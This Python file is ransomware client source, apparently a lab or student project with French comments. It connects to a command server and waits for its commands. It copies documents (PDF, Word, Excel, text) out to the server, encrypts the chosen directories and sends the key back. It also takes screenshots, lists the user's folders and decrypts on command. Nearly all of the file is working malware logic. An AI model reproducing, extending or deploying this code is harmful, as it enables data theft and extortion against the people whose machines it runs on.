import socket
import os
from screenshot_module import take_and_send_screenshot
from ransomware_module import encrypt_directory, decrypt_directory, load_key, generate_key
from screenshots import screenshot

SERVER_IP = "192.168.198.200"
PORT = 5001
KEY_FILE = "ransom_key.key"


def send_key_to_server(sock, key_file_path):
    try:
        with open(key_file_path, "rb") as f:
            key_data = f.read()
        sock.sendall(b"key:" + key_data)
        print("[+] Clé envoyée au serveur.")
    except Exception as e:
        print(f"[-] Erreur lors de l'envoi de la clé : {e}")


def save_encrypted_dir(path):
    with open("encrypted_dirs.txt", "a") as f:
        f.write(path + "\n")


def get_encrypted_dirs():
    if not os.path.exists("encrypted_dirs.txt"):
        return []
    with open("encrypted_dirs.txt", "r") as f:
        return [line.strip() for line in f if line.strip()]


def remove_decrypted_dir(path):
    if not os.path.exists("encrypted_dirs.txt"):
        return
    with open("encrypted_dirs.txt", "r") as f:
        lines = f.readlines()
    with open("encrypted_dirs.txt", "w") as f:
        for line in lines:
            if line.strip() != path:
                f.write(line)


def exfiltrate_file(file_path, sock):
    try:
        filename = os.path.basename(file_path)
        filesize = os.path.getsize(file_path)
        header = f"exfil:{filename}:{filesize}".encode().ljust(128)
        sock.sendall(header)

        with open(file_path, "rb") as f:
            while True:
                chunk = f.read(4096)
                if not chunk:
                    break
                sock.sendall(chunk)
        print(f"[+] Fichier exfiltré : {filename}")
    except Exception as e:
        print(f"[-] Erreur d'exfiltration : {e}")


def connect_to_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
        try:
            client.connect((SERVER_IP, PORT))
            print(f"[+] Connecté à {SERVER_IP}:{PORT}")

            # Générer la clé si elle n'existe pas
            if not os.path.exists(KEY_FILE):
                generate_key()
                print("[+] Clé générée sur la machine cible.")

            while True:
                command = client.recv(1024).decode(errors="ignore")
                if not command:
                    break

                if command.startswith("encrypt:"):
                    directory = command.split(":", 1)[1]
                    key = load_key()
                    print(f"[+] Chiffrement du dossier {directory}...")

                    # Exfiltration ciblée avant chiffrement
                    for root, _, files in os.walk(directory):
                        for file in files:
                            if file.lower().endswith((".pdf", ".txt", ".docx", ".xls", ".xlsx")):
                                file_path = os.path.join(root, file)
                                exfiltrate_file(file_path, client)

                    encrypt_directory(directory, key)
                    save_encrypted_dir(directory)
                    send_key_to_server(client, KEY_FILE)
                    client.sendall("[+] Dossier chiffré avec succès.".encode())

                elif command.startswith("decrypt:"):
                    directory = command.split(":", 1)[1]
                    key = load_key()
                    print(f"[-] Déchiffrement du dossier {directory}...")
                    decrypt_directory(directory, key)
                    remove_decrypted_dir(directory)
                    client.sendall("[-] Dossier déchiffré avec succès.".encode())

                elif command == "screenshot":
                    take_and_send_screenshot(client)

                    
                    # print("[+] Capture d'écran demandée...")
                    # filename = screenshot()
                    # filesize = os.path.getsize(filename)
                    # client.sendall(str(filesize).encode().ljust(16))

                    # with open(filename, "rb") as f:
                    #     client.sendall(f.read())
                    # os.remove(filename)

                elif command == "key_request":
                    print("[+] Requête de clé reçue.")
                    send_key_to_server(client, KEY_FILE)
                    encrypted_dirs = get_encrypted_dirs()
                    message = "\n".join(encrypted_dirs) if encrypted_dirs else "Aucun dossier chiffré enregistré."
                    client.sendall(message.encode())

                elif command == "exit":
                    print("[+] Fermeture de la connexion")
                    break

                elif command == "listdirs":
                    print("[+] Listing des dossiers demandé...")
                    user_path = os.path.expanduser("~")
                    top_level_dirs = []

                    for name in os.listdir(user_path):
                        full_path = os.path.join(user_path, name)
                        if os.path.isdir(full_path):
                            top_level_dirs.append(full_path)
                            try:
                                subdirs = [
                                    os.path.join(full_path, d)
                                    for d in os.listdir(full_path)
                                    if os.path.isdir(os.path.join(full_path, d))
                                ]
                                top_level_dirs.extend(subdirs)
                            except Exception:
                                top_level_dirs.append(f"{full_path}\\[Erreur d'accès]")

                    message = "\n".join(top_level_dirs) if top_level_dirs else "Aucun dossier trouvé."
                    client.sendall(message.encode())

                elif command == "list_encrypted":
                    print("[+] Listing des dossiers chiffrés...")
                    encrypted_dirs = get_encrypted_dirs()
                    message = "\n".join(encrypted_dirs) if encrypted_dirs else "Aucun dossier chiffré enregistré."
                    client.sendall(message.encode())

        except ConnectionRefusedError:
            print("[-] Impossible de se connecter au serveur. Vérifie l'IP et le port.")


if __name__ == "__main__":
    connect_to_server()
